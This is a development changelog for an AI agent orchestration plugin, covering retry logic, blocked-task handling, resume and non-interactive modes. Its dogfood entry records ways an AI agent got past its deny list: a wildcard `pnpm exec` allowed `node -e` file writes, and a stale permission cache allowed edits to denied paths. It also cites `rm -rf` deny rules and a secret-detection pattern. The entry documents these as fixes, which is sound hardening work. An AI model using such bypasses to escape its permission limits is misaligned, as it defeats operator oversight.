  - Step 4 (claim confirmation): interactive asks "Claim this task?"; non-interactive auto-claims with a single log line.
  - Step 8 (orchestrator hand-off): now passes `interactive: true|false` in the briefing.
  - Frontmatter: `argument-hint` updated, `allowed-tools` gains `Bash(env:*)`.

- `commands/resume-task.md` — same section, Step 1 dirty-worktree refusal in non-interactive, Step 5 propagates `interactive` to the orchestrator briefing.

- `commands/setup-project.md` — same section, plus four per-step rules:
  - Step 1 (missing project path): interactive offers `mkdir -p`; non-interactive refuses (the operator's intended path is ambiguous under `--yes`).
  - Step 2 (already-configured project): interactive offers reconfigure; **non-interactive refuses reconfigure** with a clear error pointing at re-running interactively. The most consequential safe-default — reconfigure overwrites `.claude/settings.json`, which would silently change the project's permission scope.
  - Step 3 (existing settings with local edits): interactive asks before overwriting; non-interactive preserves the existing file.
  - Step 6 (`.npmrc` weakened): interactive asks; non-interactive **applies the documented default** (append the missing atelier-section lines) automatically. Weakening (lowering an existing guardrail) is **never** auto-applied in either mode.

- `agents/task-orchestrator.md` — Step 1 standard-mode branch gains a non-interactive check. When the briefing carries `interactive: false` *or* the env var `ATELIER_AUTO` is set, the orchestrator skips the "Confirm the choice with the operator" prompt after `task-discovery` and proceeds with its pick. The briefing is the authoritative signal when set; the env var is the fallback for direct-invocation cases (no `/next-task` wrapper). Resume mode (M4.3) was already non-prompting; this PR only adds the standard-mode skip.

**Tests:**
- YAML frontmatter parses cleanly on all four modified files.
- Plugin loader auto-discovers the 6 atelier commands.
- End-to-end exercise (`claude -p "/atelier:next-task --yes"` running the chain without hanging) is **deferred to dogfood-2** — the same setup as dogfood-1 with this fix applied. The unit-level evidence here is that every confirmation prompt in the audit (8 distinct points across 4 files) now has a non-interactive branch with a documented safe-default rule.

**Decisions captured:**

- **Two signals (flag + env), not one.** The flag (`--yes` / `-y`) is per-invocation; the env var (`ATELIER_AUTO`) is per-session. Either alone covers the common cases — the flag for ad-hoc scripted runs, the env var for CI / sustained automation. Requiring both would be friction; supporting either is one extra `env | grep` and a `$ARGUMENTS` substring match.
- **No runtime TTY probe.** A `test -t 0` from the agent's Bash sub-process is unreliable: even when the parent `claude` is non-interactive (via `-p`), the sub-process's stdin may not propagate that state, and even when it does, the inference "no TTY → non-interactive" is right for `claude -p` but wrong for legitimate Claude Code sessions started without a terminal (some IDE harnesses). Determinism beats heuristics: the operator opts in explicitly.
- **Safe default = never overwrite, never weaken, never widen.** When in doubt about whether to proceed silently, refuse. This is conservative for `/setup-project` (refuses reconfigure on configured projects) and permissive for `/next-task` (auto-claims because the operator's intent is already "claim the next task"). The default is chosen per step, not globally — documented inline.
- **Strip flag before parsing.** `--yes` / `-y` is stripped from `$ARGUMENTS` before parsing per-command-specific arguments so commands like `/next-task #42 --yes` keep treating `#42` as the task id. Avoids a future foot-gun where a task id like `--yes-please` would never be reachable.
- **Briefing-propagation in `/next-task` and `/resume-task`.** The slash command is the operator-facing entry; the orchestrator inherits the mode via the briefing. The env var is the fallback for cases where the orchestrator is invoked directly. This keeps the orchestrator's prompt simple — one check, two sources.

**Acceptance criterion status:** the ROADMAP M4.6 acceptance — *"`claude -p \"/atelier:next-task\"` from a non-TTY shell completes the full chain without hanging on a claim/route/proceed confirmation that has no way to be answered"* — is **structurally satisfied**: every confirmation prompt in the entry-point flow now has a non-interactive branch. The end-to-end check (the same `claude -p` invocation actually running through to PR-open) waits for **dogfood-2**, which can now run because the trap from dogfood-1 is closed.

**Follow-ups (still in ROADMAP):**
- M4.7 — per-worktree `.claude/settings.json` instantiation. Independent of M4.6.
- M4.8 — `pr-author` `IN_PROGRESS.md → HISTORY.md` move enforcement. Independent.
- **Dogfood-2** is now unblocked; the natural next step once M4.7 + M4.8 land (or potentially even before).

### M4.3 — `/resume-task <id>` — 2026-05-19
**PR:** [#33](https://github.com/AkaLab-Tech/atelier/pull/33)

Third and final Phase 4 milestone. Implements the "operator's recovery action" half of the blocked-task lifecycle whose contract was set in M4.2, and additionally handles the simpler interrupted-resume case (operator's previous session was killed mid-task). With this PR, Phase 4 (Robustness) is **closed**: retry budget (M4.1), hard-stop handoff (M4.2), and recovery (M4.3) together implement [PLAN.md §8](PLAN.md) end-to-end.

**Delivered:**

- `commands/resume-task.md` — new slash command (auto-discovered as `atelier:resume-task`). Required argument `<task-id>`. Auto-detects the resume mode from `IN_PROGRESS.md` state: heading with `[BLOCKED]` marker → **blocked-resume**; heading without it → **interrupted-resume**. Two distinct flows behind one operator-facing command:
  - **Blocked-resume preflight** verifies the GitHub issue referenced in the metadata block is **`CLOSED`** (M4.2 contract: the close is the unambiguous "ready to retry" signal — refuses with an actionable error if still open or 404). Then wipes `<wt>/.task-log/` (per-file `rm` plus `rmdir`, no recursive `-r`/`-f` — the 6 logs survive in the closed issue's body), unmarks the `[BLOCKED]` heading and removes the metadata block, and commits + pushes the unmark on a dedicated `docs/resume-<id>` branch (mirrors the `unblocker` `docs/blocked-<id>` pattern so the marker round-trip is symmetric and auditable). A pair-PR is auto-opened.
  - **Interrupted-resume** keeps `.task-log/` intact (the budget continues — `retry-with-logs` Step 1 picks up at attempt N+1 on the next specialist failure) and skips all the unmark/commit cleanup.
  - **Both modes** hand off to `atelier:task-orchestrator` with an explicit `resume_mode: interrupted | blocked` flag in the briefing so the orchestrator's Step 1 jumps directly to the specialist chain.

- `agents/task-orchestrator.md` — Step 1 gains a `resume mode` branch at the top. When the briefing carries `task_id`, `worktree_path`, `branch`, and `resume_mode`, the orchestrator skips the `IN_PROGRESS.md` anomaly check, skips `task-discovery`, and jumps directly to the planning step (4). Steps 2 ("Move tracking forward") and 3 ("Set up isolation") are also skipped in resume mode since the entry is already in `IN_PROGRESS.md` and the worktree already exists. When invoked in standard mode (no `resume_mode` in the briefing), the existing anomaly-detection branch fires — and the surface message now suggests `/atelier:resume-task <id>` as the recommended recovery path (instead of just "stop and surface").

**Tests:**

- YAML frontmatter parses cleanly on both files.
- Plugin loader auto-discovers the new command. `claude --plugin-dir <worktree> --permission-mode plan -p "list commands..."` returned 6 atelier commands (`doctor`, `finish-task`, `next-task`, `setup-project`, `status`, **`resume-task`**).
- Agent loader still discovers all 7 atelier agents (`task-orchestrator`, `implementer`, `tester`, `e2e-runner`, `pr-author`, `reviewer`, `unblocker`).
- Skill loader still discovers all 7 atelier skills.
- End-to-end exercise of `/resume-task` deferred to dogfood-2 (a future run after M4.6 lands so non-interactive mode no longer traps the orchestrator's confirmation step) — the on-disk validation here is per-piece consistency between command, agent, and `unblocker`'s state mutations.

**Decisions captured:**

- **Auto-detect mode, do not let the operator pick.** Two flags (`--interrupted` vs `--blocked`) would have been a foot-gun: the operator typically doesn't know which mode applies, and getting it wrong would either silently extend the retry budget (interrupted on a really-blocked task) or destroy useful context (blocked on a really-interrupted task). The `[BLOCKED]` marker in `IN_PROGRESS.md` is unambiguous and authoritative — if it is there, it is there; if not, not. Auto-detection is safer than asking.
- **Symmetric `docs/<resume|blocked>-<id>` branch pattern.** Both `unblocker` and `resume-task` mutate `IN_PROGRESS.md` on `main` via a dedicated docs branch + auto-PR rather than direct push (which would require lifting the `git push * main` deny invariant). The pair of branches makes the audit trail trivial: each `[BLOCKED]` cycle gets a `docs/blocked-<id>` PR and a `docs/resume-<id>` PR if it was ever resumed; a search by branch prefix tells the operator the full history.
- **Wipe `.task-log/` on blocked-resume; preserve on interrupted-resume.** Documented in two layers (hard refusal section + per-step instructions) because reversing one of these by mistake either silently extends the budget past 6 (interrupted that should have wiped) or throws away in-flight context (blocked that should have preserved). The two modes have opposite invariants and the command refuses to mix them.
- **Per-file `rm` + `rmdir`, never `rm -r`.** The deny list in `settings.template.json` already covers `rm -rf` and `rm -fr` exact-arg forms, but the per-command `allowed-tools` in `resume-task.md` was scoped to `Bash(rm:*)` for `.task-log/` cleanup. The hard refusal makes explicit that the allowance is for per-file deletion only — a recursive `rm -r .task-log/` would technically pass the per-command filter but creates a generic foot-gun. Belt and braces.
- **Resume mode is signalled via the briefing, not via a separate command on the orchestrator.** The orchestrator agent definition has no new tools or skill calls; the only change is one branch at the start of Step 1 that reads the briefing for `resume_mode`. Same agent, two entry points (`/next-task` vs `/resume-task`), one specialist chain.

**Phase 4 closed with this PR.** The three M4.x milestones now compose the full failure-recovery contract from [PLAN.md §8](PLAN.md):
- M4.1 — the retry budget mechanics + per-attempt log persistence ([PR #30](https://github.com/AkaLab-Tech/atelier/pull/30)).
- M4.2 — the hard-stop handoff: turn a 6-fail outcome into operator-visible state (GitHub `blocked` issue + `[BLOCKED]` marker) and advance to the next task ([PR #31](https://github.com/AkaLab-Tech/atelier/pull/31)).
- M4.3 — the operator's recovery action: close the issue → resume → fresh attempt. Also handles plain session-killed-mid-task interruptions. (this PR).

**Follow-ups (already documented in ROADMAP from dogfood-1):**
- M4.6 (non-interactive mode for `/next-task` and orchestrator) becomes especially load-bearing for `/resume-task` too — both commands trap on confirmation prompts under `claude -p`.
- M4.7 (per-worktree `.claude/settings.json` instantiation) is what makes a Claude session opened *directly inside* a per-task worktree (e.g., after `/resume-task` writes to that worktree's branch) work without inheriting an unrelated permission scope.
- M4.8 (`pr-author` HISTORY move enforcement) and the dogfood-2 end-to-end exercise both wait until the above land.

### Dogfood-1 — first end-to-end run on a real GitHub repo — 2026-05-19
**PR:** [#32](https://github.com/AkaLab-Tech/atelier/pull/32)

First real end-to-end exercise of the full atelier chain on a real GitHub repo (`AkaLab-Tech/atelier-dogfood-1`, private). Pre-implementation milestones M1.x–M4.2 had only been validated piece-by-piece; this is the first time the orchestrator + 6 specialists + retry/unblocker loop ran on a real project, end-to-end, against a forced-failure task. Surfaced **14 atelier findings** and **2 distinct deny-list bypass vulnerabilities** that pre-existed in the auto-merge guardrails but had never been exercised by a sub-agent.

**Three runs:**

1. **Run 1 (pre-flight blocked, no chain executed)** — `/atelier:next-task` aborted before invoking any specialist. Two systemic blockers: (a) the `scan-edit-write` hook's `hardcoded-secret-known-prefix` pattern was a bare-substring match on `sk-` and triggered on every atelier worktree path (`task-N-slug` contains the substring `sk-`); (b) the per-worktree path `<repo>-worktrees/...` was outside the sandbox `additionalDirectories` from `settings.template.json`, so the orchestrator could not operate inside the worktree it had just created.
2. **Run 2 (happy-path Task #1, full chain executed)** — after the three Phase-A fixes, the chain ran end-to-end: `task-discovery → task-orchestrator → git-wt switch → implementer → tester → e2e-runner (skipped, no UI) → pr-author → reviewer → auto-merge (held)`. [PR #1](https://github.com/AkaLab-Tech/atelier-dogfood-1/pull/1) opened on the dogfood repo, +24/-9 across 4 files. The `auto-merge` skill correctly held the PR — but for a non-actionable reason: GitHub rejects self-approval when `pr-author` and `reviewer` run under the same identity, so the reviewer's verdict landed as a comment, tripping guardrails #2 (review status) and #6 (pending human comment). The PR was squash-merged manually for dogfood progress.
3. **Run 3 (forced-failure Task #2, hard-stop validation)** — designed to exercise [PLAN.md §8](PLAN.md)'s retry budget by requesting an `Edit(./package.json)` which is in the per-worktree deny list. The chain ran exactly as the spec promises: 6 attempts written to `<worktree>/.task-log/<ISO-timestamp>-<NN>.md` with the reset between attempt 03 and 04 (and a temp-copy of `.task-log/` preserved at `<repo>-worktrees/.atelier-task-log-2/`), `retry-with-logs` returned `hard-stop` after attempt 06, the `unblocker` agent opened [issue #2](https://github.com/AkaLab-Tech/atelier-dogfood-1/issues/2) on GitHub with the 6 logs verbatim + a structured root-cause synthesis, and applied the `blocked` label (created idempotently since the label didn't exist). **M4.1 + M4.2 are now validated end-to-end on a real GitHub repo.**

**Five fixes landed in this PR:**

- `hooks/patterns/scan-edit-write.json` — `hardcoded-secret-known-prefix` rewritten from a bare substring list (`["sk-", "gho_", ...]`) to a regex requiring (a) a non-identifier boundary before the prefix and (b) a credential-shaped body of 20+/30+ chars after each prefix. Validated 10/10 negatives + 10/10 positives via a bash script. Fixes Findings #4 and #9 (the same regex bug surfaced twice).
- `templates/settings.template.json` — `additionalDirectories` extended from `["<worktree>"]` to `["<worktree>", "<worktree>-worktrees"]`; `Edit/Write/Read` allow patterns extended with matching `<worktree>-worktrees/**` entries. After `sed` substitution by `/setup-project`, this gives the operator's session pre-authorised access to every per-task worktree the orchestrator may create. Fixes Finding #8.
- `commands/setup-project.md` — step 3 now asserts `$CLAUDE_PLUGIN_ROOT` resolves to a directory containing `templates/settings.template.json` BEFORE attempting the `sed` instantiation, and stops with an actionable error if either check fails (with explicit recovery instructions: install via marketplace, or `export CLAUDE_PLUGIN_ROOT=…` for a one-off CLI run). Fixes Findings #2 (env var unset under `--plugin-dir`) and #3 (Step 3 had been silently failing without surfacing the error).
- `agents/unblocker.md` — Step 5 rewritten to mark `[BLOCKED]` in the **main worktree's** `IN_PROGRESS.md` (not the failed task's worktree copy) and **commit+push** the change on a dedicated `docs/blocked-<task-id>` branch so the marker reaches `main`. Without this, the marker stayed local to the failed worktree, `main` never saw it, and the next `/next-task` would re-pick the same task forever. Fixes Finding #14.
- `templates/settings.template.json` — `Bash(pnpm exec *)` (broad wildcard) replaced with a per-binary allow list (`pnpm exec eslint*`, `pnpm exec prettier*`, `pnpm exec tsc*`, `pnpm exec vitest*`, `pnpm exec jest*`, `pnpm exec playwright*`, `pnpm exec tsx*`). The wildcard allowed `pnpm exec node -e "fs.writeFileSync(...)"` to be used as a side-channel to write to deny-listed paths, which the implementer discovered during attempt 03 of run 3 and reverted as a hard refusal. **Fixes the security finding (Finding A from issue #2 on the dogfood repo).**

**Findings deferred to follow-up milestones (documented in this PR's ROADMAP edits):**

- **M4.6** — `/next-task` and orchestrator must detect non-interactive (`-p`) mode and skip operator-confirmation prompts. (Finding #7 from run 1 — operator confirmation traps a `-p` invocation.)
- **M4.7** — the orchestrator must instantiate a per-worktree `.claude/settings.json` (currently the sandbox blocks the write and the sub-agents silently inherit the main session's scope). (Finding #12 from run 2.)
- **M4.8** — `pr-author` must enforce the `IN_PROGRESS.md → HISTORY.md` move (its own prompt says it does, but in run 2 it did not). Alternatively, reassign the move to `auto-merge`'s post-merge cleanup. (Finding #13 from run 2.)
- **M6.4** — operator troubleshooting doc must call out two non-atelier issues with operator-side mitigations: (a) GitHub same-identity self-approval limitation (Finding #11 from run 2), and (b) Claude Code permission-cache mis-alignment after `git worktree remove --force` + `git worktree add`, which dogfood-1 showed lets two `Edit` calls succeed on a deny-listed path post-reset (Finding B from issue #2).

**Decisions captured:**

- **Hook regex with both word-boundary AND length floor.** Either alone would close some of the false-positive surface; the combination is what makes `task-N-slug` clearly safe (no non-identifier boundary in front of `sk-` once `task-` precedes it) AND `sk-` alone clearly safe (no 20-char body). The two checks compose without weakening real-credential detection.
- **Hard refusal on Step 3 of `/setup-project` rather than silent skip.** Run 1 showed silent skip leaves the project half-configured (no `.claude/settings.json`, but `.npmrc` and the markdown files written), which is worse than not running setup at all — the operator believes setup succeeded. The hard-refusal recovery message is verbose by design.
- **`pnpm exec` narrowed by per-binary entries, not by adding `node -e` to deny.** A new deny entry for `node -e` would not have closed the bypass (the attacker can use `bash -c`, `python -c`, etc.); the only sound fix is to drop the wildcard. The seven binaries chosen (`eslint`, `prettier`, `tsc`, `vitest`, `jest`, `playwright`, `tsx`) cover the testing/linting needs of a typical Phase 2 task; new binaries get added explicitly in a future PR with justification.
- **Unblocker's docs-PR approach over direct push to `main`.** A direct push would require lifting the `Bash(git push * main)` deny rule, which is a load-bearing safety invariant. A docs PR for a 1-line `IN_PROGRESS.md` change is light enough that it could even auto-merge (it touches none of the auto-merge-blocking files), and it preserves the audit trail.

**Acceptance criterion status:** there is no formal ROADMAP entry for "dogfood-1" — this is a friction-discovery exercise, not a planned milestone. The five blockers were the *implicit* acceptance criterion, and all five are now resolved (three in run 1's pre-flight, two more after run 2/3 surfaced them). The remaining four ROADMAP items (M4.6 / M4.7 / M4.8 / M6.4) are the deferred portion that does not block end-to-end runs.

### M4.2 — `unblocker` agent — 2026-05-19
**PR:** [#31](https://github.com/AkaLab-Tech/atelier/pull/31)

Second Phase 4 milestone. Closes the loop on `retry-with-logs` (M4.1) by turning the `hard-stop` decision into operator-visible state: a GitHub `blocked` issue with all 6 attempt logs attached, a `[BLOCKED]` marker in `IN_PROGRESS.md`, and an automatic handoff back to the orchestrator so the next ROADMAP item is picked up without human intervention.

**Delivered:**
- `agents/unblocker.md` — new specialist (Sonnet, color `orange`). Invoked **only** by `task-orchestrator` when `retry-with-logs` returns `hard-stop`. Six explicit steps: (1) verify exactly 6 logs on disk; (2) ensure the GitHub `blocked` label exists (creates it idempotently with color `#B60205` if missing); (3) build the issue body with an apparent-root-cause synthesis + the 6 logs verbatim inside `<details>` blocks (truncates to 3 KB/log if total exceeds GitHub's 65 536-char issue-body limit, surfacing the truncation in the report); (4) `gh issue create --title "[blocked] <task-id> — <title>" --label blocked --body-file ...`; (5) edit `IN_PROGRESS.md` to rename the heading to `<task-id> — <title> — [BLOCKED] see #<NN>` and prepend a metadata block (issue URL, worktree path, log count) while leaving the original task block intact below; (6) return a structured `unblocker report` the orchestrator parses. Hard refusals: never modifies code, never `git wt rm` (worktree is evidence), never opens the issue without the `blocked` label, never opens a second `blocked` issue for the same `<task-id>`, never marks `[BLOCKED]` an entry that was not in `IN_PROGRESS.md`.
- `agents/task-orchestrator.md` — three structural changes: **(a)** Step 1 ("Pick the task") now reads `IN_PROGRESS.md` first and filters entries with the literal `[BLOCKED]` marker silently (they belong to the operator's queue, not to a fresh pick); a remaining non-blocked active entry surfaces an anomaly and stops the orchestrator. **(b)** Step 5 lists `unblocker` as a specialist that is **not** part of the happy-path chain but is invoked from the retry loop. **(c)** Step 6's `hard-stop` branch now invokes `unblocker` (instead of "surface to operator") and Step 7 gains a fourth `unblocker → advance to next task` branch that loops back to Step 1, which now correctly ignores the just-blocked `[BLOCKED]` entry. The output schema's Status line updated from `blocked — see <log-path>` to `blocked — see <issue-url>`.
- `templates/settings.template.json` — added `Bash(gh label list*)` and `Bash(gh label create*)` next to the existing `Bash(gh issue *)` entry, scope-minimum. Required for the unblocker's idempotent label-creation step (no fallback path: the issue must carry the `blocked` label or the operator's queue view breaks).
- `ROADMAP.md` — two new low-priority follow-ups identified during this milestone's design and deferred (separate commit, `bd7fc9f`): **M4.4** extend `/status` to list `[BLOCKED]` tasks alongside the active one; **M4.5** `/abandon-task <id>` to automate the Camino C of the blocked-task lifecycle (operator decides not to retry — close issue as `wontfix` + move `IN_PROGRESS` → `HISTORY` with `abandoned` mark).

**Tests:**
- YAML frontmatter parses cleanly on both files (`agents/unblocker.md`, updated `agents/task-orchestrator.md`).
- Plugin loader auto-discovers the new agent. `claude --plugin-dir <worktree> --permission-mode plan -p "list agents..."` returned 7 atelier agents (`task-orchestrator`, `implementer`, `tester`, `e2e-runner`, `pr-author`, `reviewer`, **`unblocker`**) and confirmed the 7 atelier skills (including `retry-with-logs`) are still intact.
- `python3 -m json.tool` clean on `templates/settings.template.json` after the two new permission entries.

**Decisions captured:**
- **Sonnet, not Opus.** The unblocker reads 6 already-structured logs (each log's `Reasoning on what went wrong` is the specialist's own post-mortem) and synthesises one paragraph + writes a GitHub issue. No deep reasoning required — Sonnet at lower cost.
- **`blocked` label is mandatory, not optional.** The operator's primary "what is blocked?" view is `gh issue list --label blocked` (or the equivalent label filter in the GitHub UI). Without the label the issue is just one more issue in the noise — discoverability collapses. The idempotent label-creation step accepts the small added permission surface (`gh label create`) as the cost.
- **Task stays in `IN_PROGRESS.md` with `[BLOCKED]` marker (not moved back to ROADMAP).** Considered three placements: (a) keep in `IN_PROGRESS` with marker, (b) move back to `ROADMAP.md` with a `blocked_by:<issue-number>` annotation, (c) introduce a new `BLOCKED.md` file. Picked (a): preserves the `ROADMAP → IN_PROGRESS → HISTORY` convention, requires zero `task-discovery` changes, and the `[BLOCKED]` marker is greppable. Option (b) would have required `task-discovery` to learn how to resolve `blocked_by:#<issue>` against a remote GitHub issue's open/closed state — invasive cross-cutting change. Option (c) breaks the three-file convention.
- **Cierre del issue de GitHub == "ready to retry" signal.** The operator's contract: investigate, fix something (or decide nothing needs fixing), **close the issue**, run `/resume-task <id>` (M4.3, not in this PR). The close itself is the unambiguous signal. An open issue means the task is still under operator triage; `/resume-task` will refuse if the issue is still open.
- **Budget renews to 6 on resume.** When `/resume-task` lands in M4.3, it will delete `<worktree>/.task-log/` (the 6 logs are preserved in the closed issue's body) and start the retry counter at 0 again — clean slate, full 6 new attempts. Continuing the counter would mean "resume" only gives the operator a partial budget, which contradicts the user's intent of "I fixed something, try again properly".
- **Orchestrator advances automatically after `unblocker`.** Per PLAN.md §8 ("move to next task" after hard stop). The orchestrator loops back to Step 1, which now filters the just-`[BLOCKED]` entry and proceeds to `task-discovery` for the next ROADMAP item. The loop terminates after the next task's own chain ends (merged | held | request-changes | blocked) — it does not chain indefinitely across the entire ROADMAP unless the operator asked for it explicitly.
- **Worktree preserved after `hard-stop`.** The orchestrator and the unblocker both refuse to `git wt rm` a hard-stopped task's worktree. The worktree is the evidence the operator inspects to understand the failure; removing it would orphan the issue from its on-disk artifacts.
- **GitHub issue body cap handled by per-log truncation, not full-log dropping.** If the 6 logs exceed GitHub's 65 536-char limit, each log's `<details>` block is truncated to 3 KB and a `[truncated — full log at <path>]` notice is added. Worst case: the operator opens the worktree to read the full log. Better than dropping a whole log entry.

**Acceptance criterion status:** the ROADMAP M4.2 acceptance — *"the 6-failure scenario from M4.1 ends with a `blocked` issue created and the next task picked up"* — is **structurally satisfied**: the unblocker creates the GitHub issue (with the `blocked` label, with the 6 logs verbatim, with the URL handed back to the orchestrator), marks the entry in `IN_PROGRESS.md`, and the orchestrator's Step 7 wires the "advance to next task" branch. The end-to-end exercise (deterministic failing test → 6 attempts → real `blocked` issue created on a toy repo) is captured in the Test plan of PR #31 as still-deferred under "do NOT validate as part of this PR" because it requires the dogfooding setup from M7.1 (toy repo with `test.sh` that exits 1, real GitHub remote, settings.template instantiated). The complete close on that checkbox lands with the dogfooding milestone, not here.

**Follow-ups (carried forward into Phase 4+ and beyond):**
- M4.3 (`/resume-task <id>`) implements the "operator closed the issue, retry" handler — the contract this PR established (close-issue-as-ready signal, budget renews to 6, `.task-log/` wiped, re-entry from `implementer`).
- M4.4 (extend `/status` for blocked tasks) and M4.5 (`/abandon-task <id>` for Camino C) — both documented in ROADMAP in commit `bd7fc9f`.
- Dogfooding (M7.1) will be the first time the full Phase 4 loop runs against a real (non-toy) project, exercising the `[BLOCKED]` → close issue → `/resume-task` cycle end-to-end.

### M4.1 — Retry logic with log persistence — 2026-05-19
**PR:** [#30](https://github.com/AkaLab-Tech/atelier/pull/30)

First Phase 4 milestone. Materializes the fixed retry budget from [PLAN.md §8](PLAN.md) (3 attempts → reset → 3 attempts → hard stop) as an executable skill the `task-orchestrator` invokes on every specialist failure. Removes the orchestrator's freedom to interpret the policy and replaces it with a finite-state machine: count logs, pick the decision from a table, write a structured per-attempt log.

**Delivered:**
- `templates/task-log/attempt.md` — the per-attempt log template. Five mandatory sections per [PLAN.md §8](PLAN.md): `Initial hypothesis`, `Actions taken`, `Final error` (verbatim, never paraphrased), `Reasoning on what went wrong`, plus a `Next attempt should` block that seeds the following attempt's hypothesis. Filename convention is `<YYYY-MM-DDTHHMMSS-UTC>-<NN>.md` (lexicographically sortable, FS-safe, attempt number zero-padded so `01..06` sort naturally).
- `skills/retry-with-logs/SKILL.md` — the executable form of [PLAN.md §8](PLAN.md). On every specialist failure: counts existing `.task-log/*.md` files, computes the next attempt number `N`, refuses to continue past `N=6`, writes the log from the template at `$CLAUDE_PLUGIN_ROOT/templates/task-log/attempt.md`, and returns one of three decisions: `continue` (retry in same worktree), `reset` (preserve `.task-log/` outside the worktree, run `git wt rm` + `git wt switch` to recreate from updated base, restore the logs, then retry — happens only after attempt 03 fails), `hard-stop` (after attempt 06, hand off to `unblocker` when M4.2 ships; surface to operator until then). The `.task-log/` directory MUST survive the reset between attempts 03 and 04 — the skill copies it to `/tmp/atelier-task-log-<branch>/` before `git wt rm` and restores it after `git wt switch`, otherwise attempts 04..06 lose the prior history and the retry loop is amnesic.
- `agents/task-orchestrator.md` — core-responsibility #6 ("Enforce the retry budget") rewritten to delegate to the skill instead of interpreting the policy inline. Three explicit branches per returned decision: `continue` → re-invoke specialist with all `.task-log/*.md` as context; `reset` → preserve logs, run wt cycle, restore logs, retry; `hard-stop` → stop, hand off to `unblocker` (M4.2) or surface to operator.

**Tests:**
- YAML frontmatter parses cleanly on the new skill (`name=retry-with-logs`) and the updated agent (`name=task-orchestrator`).
- Plugin loader auto-discovers the skill. `claude --plugin-dir <worktree> --permission-mode plan -p "list skills..."` returned 7 atelier skills (`task-discovery`, `pr-flow`, `safe-commit`, `safe-install`, `visual-validation`, `auto-merge`, **`retry-with-logs`**).
- Agent loader still discovers all 6 agents (`task-orchestrator`, `implementer`, `tester`, `e2e-runner`, `pr-author`, `reviewer`) after the orchestrator edit.
- `python3 -m json.tool` clean on `hooks/hooks.json` (no template changes needed; no new permissions required because the skill only reads/writes files inside the worktree and the existing `Edit`/`Write` patterns already cover `.task-log/`).

**Decisions captured:**
- **Skill, not standalone agent.** The retry policy is invoked from inside `task-orchestrator` on every failure, not as a top-level entry point. A `retry-with-logs` agent would mean spawning a sub-conversation just to count files, which is more cost and context than the procedure warrants.
- **Skill describes; orchestrator executes.** Matches the `auto-merge` and `safe-install` patterns. The skill is the procedure document + decision table; the orchestrator runs the `ls`, the `cp`, the `git wt` calls. This keeps the skill stateless and the orchestrator in charge of the worktree.
- **`.task-log/` survives the reset via temp-copy.** Considered (a) committing logs to the branch, (b) keeping them in `.task-log/` and relying on `git wt rm` to preserve files via stash, (c) temp-copy out and back. Option (c) is the only one that works regardless of project gitignore conventions; (a) requires `.task-log/` to not be gitignored, which conflicts with `<worktree>/.task-log/` being intentionally local-only; (b) does not work because `git wt rm` removes the directory entirely.
- **UTC timestamps, zero-padded attempt number.** Reset-and-retry can span hours and timezones; UTC + lexicographic sort + zero-padded attempt number means `ls -1 .task-log/` always returns the logs in chronological order, no parsing required.
- **No retry-budget guardrail hook in this milestone.** Considered a `PreToolUse` hook that counts `.task-log/*.md` files and blocks if `> 6`, as a mechanical backstop on the orchestrator's discipline. Decided to defer to M4.2 — the `unblocker` agent owns the hard-stop semantics end-to-end, so the guardrail belongs in its skill or hook, not as a free-floating PreToolUse rule whose tool-match is hard to scope correctly.
- **Off-by-one explicit in the skill.** PLAN.md §8 says "3 attempts → reset → 3 more". The decision returned **after attempt 03 fails** is `reset`, not `continue`; the decision returned **after attempt 06 fails** is `hard-stop`. Encoded as a table in the skill so the orchestrator does not have to derive it on the fly.

**Acceptance criterion status:** the ROADMAP M4.1 acceptance — *"injecting a deterministic failing test triggers exactly 3 retries, then a reset, then 3 more, then escalation"* — is **structurally satisfied**: the skill enforces the 3+3 split via the decision table, the orchestrator delegates the retry-budget logic to the skill, and the hard-stop is wired to the future `unblocker` hand-off. End-to-end exercise (deterministic failing test → 6 attempts → blocked issue) waits for M4.2 (`unblocker` agent) and M7.1 (real-project dogfooding).

**Follow-ups (carried forward into Phase 4 / 5):**
- M4.2 (`unblocker` agent) consumes the `hard-stop` decision from this skill: opens the `blocked` GitHub issue, attaches every `.task-log/*.md`, notifies the operator, advances the orchestrator to the next ROADMAP item.
- M4.3 (`/resume-task <id>`) re-attaches to an existing worktree, reads `.task-log/` to determine the last successful step, and resumes from there. The fixed filename convention from this milestone is the contract `/resume-task` depends on.
- The retry-budget PreToolUse guardrail hook (deferred above) can be reconsidered after M4.2 ships, once we know whether the orchestrator + skill discipline is sufficient in practice.

### M3.3 — Auto-merge logic with guardrails — 2026-05-19
**PR:** [#29](https://github.com/AkaLab-Tech/atelier/pull/29)

Final Phase 3 milestone. Closes the autonomous-merge loop: when the chain (`implementer` → `tester` → `e2e-runner` → `pr-author` → `reviewer`) ends green, this skill evaluates the six [PLAN.md §6](PLAN.md) guardrails and squash-merges the PR (or holds it for human review). Phase 3 closed.

**Delivered:**
- `skills/auto-merge/SKILL.md` — the executable form of the PLAN.md §6 auto-merge gate. Reads PR metadata via `gh pr view --json`, evaluates **six short-circuiting guardrails** in order, and only merges when **all** pass:
  1. **PR is not a draft.**
  2. **`reviewDecision == "APPROVED"`** — honours GitHub's net verdict (if a human marks `request-changes` after `atelier:reviewer` approved, GitHub returns `CHANGES_REQUESTED` and this guardrail trips).
  3. **All CI checks SUCCESS** (`statusCheckRollup` walked check-by-check; empty array treated as pass with explicit "no CI configured" note).
  4. **No forbidden files in the diff** — `package.json`, `pnpm-lock.yaml` / `package-lock.json` / `yarn.lock`, `Dockerfile*`, `docker-compose*.{yml,yaml}`, `.github/workflows/**`.
  5. **PR size `additions + deletions ≤ 500`**.
  6. **No unresolved human comments** — heuristic: any non-bot comment without a resolution marker (`resolved`, `done`, `lgtm`, `looks good`, leading `:+1:` / `👍`).
  On pass: `gh pr merge --squash --delete-branch --body-file <(echo "")` (squash strategy only, no rebase/merge-commit). Capture the merge commit SHA. Post-merge cleanup: `git wt rm <branch>` with operator confirmation (no auto-confirm), verify the task entry is in `HISTORY.md` (already moved by `pr-flow`), and surface any orphan local task branches. On any guardrail failure: report `held: <reasons>` and stop — the operator decides when to re-invoke.
- `agents/task-orchestrator.md` — chain updated to include the new specialists from M3.1 and M3.2 plus this milestone's skill: `implementer → tester → e2e-runner (when UI surface) → pr-author → reviewer → auto-merge`. The output schema gains a `Status` field that surfaces one of `merged (<sha>)` | `held — <guardrails>` | `request-changes (N findings)` | `blocked — see <log-path>`. The orchestrator now knows not to invoke `auto-merge` after `reviewer` returns `request-changes`.

**Tests:**
- YAML frontmatter parses cleanly on the new skill and the updated agent.
